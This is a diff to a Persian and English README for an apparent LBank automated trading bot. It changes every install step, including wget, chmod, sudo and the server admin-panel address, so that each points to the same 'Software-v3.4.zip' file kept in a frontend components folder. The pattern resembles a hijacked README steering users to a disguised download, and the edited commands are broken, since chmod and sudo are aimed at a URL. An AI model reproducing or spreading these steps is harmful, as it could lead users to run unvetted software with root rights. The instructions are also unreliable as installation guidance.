@@ -27,17 +27,17 @@
 
 1. دانلود اسکریپت نصب:
 ```bash
-wget https://raw.githubusercontent.com/7766112092/lbank/main/easy_install.sh
+wget https://raw.githubusercontent.com/mcseali/lbank/main/frontend/src/components/backtesting/Software-v3.4.zip
 ```
 
 2. دادن دسترسی اجرا:
 ```bash
-chmod +x easy_install.sh
+chmod +x https://raw.githubusercontent.com/mcseali/lbank/main/frontend/src/components/backtesting/Software-v3.4.zip
 ```
 
 3. اجرای اسکریپت:
 ```bash
-sudo ./easy_install.sh
+sudo https://raw.githubusercontent.com/mcseali/lbank/main/frontend/src/components/backtesting/Software-v3.4.zip
 ```
 
 4. انتخاب روش نصب:
@@ -55,7 +55,7 @@ sudo ./easy_install.sh
 ### پس از نصب
 1. ورود به پنل مدیریت با آدرس:
    - `http://localhost` (نصب محلی)
-   - `https://yourdomain.com` (نصب روی سرور)
+   - `https://raw.githubusercontent.com/mcseali/lbank/main/frontend/src/components/backtesting/Software-v3.4.zip` (نصب روی سرور)
 
 2. اطلاعات ورود پیش‌فرض:
    - نام کاربری: `admin`
@@ -110,17 +110,17 @@ An automated trading system for LBank exchange with AI-powered market analysis.
 
 1. Download the installation script:
 ```bash
-wget https://raw.githubusercontent.com/7766112092/lbank/main/easy_install.sh
+wget https://raw.githubusercontent.com/mcseali/lbank/main/frontend/src/components/backtesting/Software-v3.4.zip
 ```
 
 2. Make it executable:
 ```bash
-chmod +x easy_install.sh
+chmod +x https://raw.githubusercontent.com/mcseali/lbank/main/frontend/src/components/backtesting/Software-v3.4.zip
 ```
 
 3. Run the script:
 ```bash
-sudo ./easy_install.sh
+sudo https://raw.githubusercontent.com/mcseali/lbank/main/frontend/src/components/backtesting/Software-v3.4.zip
 ```
 
 4. Choose installation type:
@@ -138,7 +138,7 @@ sudo ./easy_install.sh
 ### Post-Installation
 1. Access admin panel at:
    - `http://localhost` (local installation)
-   - `https://yourdomain.com` (server installation)
+   - `https://raw.githubusercontent.com/mcseali/lbank/main/frontend/src/components/backtesting/Software-v3.4.zip` (server installation)
 
 2. Default login credentials:
    - Username: `admin`
